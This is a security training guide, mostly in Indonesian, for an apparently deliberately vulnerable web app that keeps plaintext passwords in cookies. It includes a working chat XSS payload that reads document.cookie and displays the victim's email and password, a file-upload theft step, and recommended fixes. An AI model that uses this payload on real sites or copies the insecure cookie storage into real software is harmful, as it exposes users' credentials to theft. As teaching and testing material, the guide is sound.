# ğŸª Cookie Credential Storage Vulnerability Test

## ğŸ“‹ Deskripsi Kerentanan

Aplikasi menyimpan credential login pengguna (termasuk password plaintext) di browser cookies. Ini adalah vulnerability CRITICAL yang memungkinkan:

- **Password Theft**: Password tersimpan dalam plaintext di cookies
- **Account Takeover**: Credentials bisa dicuri dan digunakan untuk login
- **Session Hijacking**: Data sensitif accessible via JavaScript
- **XSS Exploitation**: Payload dapat mengakses semua credential

## ğŸ¯ Cara Testing

### **Step 1: Login Normal**
1. Buka aplikasi dan login dengan credentials apapun
2. Credentials akan otomatis tersimpan di cookies

### **Step 2: Lihat Cookies (Manual)**
1. Buka Developer Tools (F12)
2. Tab Application â†’ Storage â†’ Cookies
3. Lihat cookies yang tersimpan:
   - `user_email` - Email pengguna
   - `user_password` - Password dalam plaintext! âš ï¸
   - `user_id` - ID pengguna
   - `user_role` - Role pengguna
   - `user_name` - Nama pengguna
   - `login_timestamp` - Waktu login

### **Step 3: Lihat via UI (Development Mode)**
1. Setelah login, lihat header aplikasi
2. Klik tombol mata (ğŸ‘ï¸) di sebelah toggle theme
3. Panel merah akan muncul menampilkan semua credentials

### **Step 4: Exploit via JavaScript (File Upload)**
1. Upload file `cookie_theft.js` via file upload feature
2. File akan otomatis dieksekusi dan mencuri credentials
3. Check browser console untuk melihat data yang dicuri
4. Popup akan menampilkan ringkasan credentials yang dicuri

### **Step 5: Exploit via Chat XSS**
Kirim pesan chat dengan payload:
```javascript
<script>
// Curi credentials dari cookies
const cookies = document.cookie.split(';').reduce((acc, cookie) => {
    const [key, value] = cookie.trim().split('=');
    acc[key] = value;
    return acc;
}, {});

alert('Credentials dicuri!\\n' + 
      'Email: ' + (cookies.user_email || 'None') + '\\n' +
      'Password: ' + (cookies.user_password || 'None'));
</script>
```

## ğŸš¨ Hasil yang Diharapkan

### **Console Output:**
```
ğŸš¨ COOKIE CREDENTIAL THEFT PAYLOAD ACTIVATED!
ğŸ”“ CREDENTIALS SUCCESSFULLY STOLEN FROM COOKIES:
ğŸ“§ Email: user@example.com
ğŸ”‘ Password: userpassword123
ğŸ†” User ID: abc-123-def
ğŸ‘¤ Role: Manager
ğŸ“› Name: John Doe
```

### **Visual Indicators:**
- Red notification panel menampilkan credentials
- Popup alert dengan ringkasan stolen data
- Browser console logs detail attack

### **Cookies di Browser:**
```
user_email=user@example.com
user_password=plaintext_password_here
user_id=user_id_here
user_role=Manager
user_name=User Name
login_timestamp=2025-10-16T...
```

## ğŸ”¥ Dampak Keamanan

### **CRITICAL Vulnerabilities:**
1. **Plaintext Password Storage** - Password disimpan tanpa encryption
2. **JavaScript Accessible** - Cookies bisa diakses via document.cookie
3. **XSS Exploitation** - Malicious scripts bisa mencuri credentials
4. **Session Hijacking** - Attacker bisa menggunakan stolen credentials

### **Attack Scenarios:**
- **Scenario 1**: XSS di chat â†’ steal cookies â†’ account takeover
- **Scenario 2**: File upload payload â†’ credential exfiltration
- **Scenario 3**: Man-in-the-middle â†’ cookie theft â†’ persistent access

## ğŸ›¡ï¸ Cara Memperbaiki

### **DO NOT DO (Current Implementation):**
```javascript
// VULNERABLE - Storing plaintext password
document.cookie = `user_password=${password}`;
```

### **PROPER SOLUTIONS:**

#### **1. Secure Session Management:**
```javascript
// Store only secure session token (httpOnly)
// No user credentials in cookies
const sessionToken = generateSecureToken();
```

#### **2. Encrypted Storage:**
```javascript
// If must store locally, use encryption
const encryptedData = encrypt(sensitiveData, userKey);
localStorage.setItem('encrypted_session', encryptedData);
```

#### **3. httpOnly Cookies:**
```javascript
// Server-side only cookies
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
```

#### **4. Remove Credential Storage:**
```javascript
// Never store credentials client-side
// Use proper session management
// Rely on secure server-side authentication
```

## âš ï¸ Warning

**NEVER implement this in production!** 

Kerentanan ini dibuat khusus untuk:
- Security research dan education
- Penetration testing
- Developer security training
- Vulnerability demonstration

Penggunaan yang tidak bertanggung jawab dapat melanggar hukum dan etika.

---

**ğŸ¯ Key Takeaway**: Storing user credentials (especially passwords) in browser cookies is one of the most dangerous security vulnerabilities. Always use proper session management and never store sensitive data client-side!